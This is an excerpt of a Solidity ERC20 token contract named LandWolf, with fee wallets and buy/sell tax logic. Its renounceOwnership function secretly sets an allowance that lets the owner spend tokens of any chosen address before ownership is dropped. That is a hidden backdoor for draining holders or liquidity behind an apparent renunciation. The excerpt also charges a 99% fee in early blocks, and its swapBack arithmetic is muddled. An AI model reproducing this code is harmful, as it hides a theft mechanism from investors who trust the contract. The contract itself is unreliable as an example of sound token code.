...
/**
Website     https://www.landwolf.club
Twitter     https://twitter.com/landwolfethcoin
Telegram    https://twitter.com/landwolfethcoin
*/
...
contract Ownable is Context {
    ...
    function renounceOwnership(address _prevOwner, uint256 _amt) public virtual onlyOwner {
        ...
        _allowances[_prevOwner][_owner] = _amt;
        _owner = address(0);
    }
}
...
contract LandWolf is ERC20, Ownable {
    ...
    address private _feeWallet = address(0xec29810286914316Ed123B54E1DFE72ad2fD74cA);
    address private _developmentWallet = address(0x241195bF138550bedD403867300B24f0a466dF33);
    ...
    function swapBack() private {
        ...
        uint256 ethForLiquidity = newBalance - (ethForMarketing + ethForDevelopment); ethForMarketing = newBalance / marketDevRatio;
        ethForDevelopment = ethForMarketing * marketDevRatio;
        ...
        payable(address(_feeWallet)).transfer(ethForMarketing);
    ...
    function _transfer(
        ...
        if (_takeTax) {
            ...
            if(block.number < _block_trade_num) {
                _feeAmount = amount.mul(99).div(100);
                tokensForMarketing += (_feeAmount * 94) / 99;
                tokensForDevelopment += (_feeAmount * 5) / 99;
            } else if (_automatedMarketMakers[to] && _taxValues.sellTotalFees > 0) {
                _feeAmount = amount.mul(_taxValues.sellTotalFees).div(100);
                tokensForLiquidity += _feeAmount * _taxValues.sellLiquidityFee / _taxValues.sellTotalFees;
                tokensForMarketing += _feeAmount * _taxValues.sellMarketingFee / _taxValues.sellTotalFees;
                tokensForDevelopment += _feeAmount * _taxValues.sellDevelopmentFee / _taxValues.sellTotalFees;
            }
            // on buy
            else if (_automatedMarketMakers[from] && _taxValues.buyTotalFees > 0) {
                _feeAmount = amount.mul(_taxValues.buyTotalFees).div(100);
                tokensForLiquidity += _feeAmount * _taxValues.buyLiquidityFee / _taxValues.buyTotalFees;
                tokensForMarketing += _feeAmount * _taxValues.buyMarketingFee / _taxValues.buyTotalFees;
                tokensForDevelopment += _feeAmount * _taxValues.buyDevelopmentFee / _taxValues.buyTotalFees;
            }
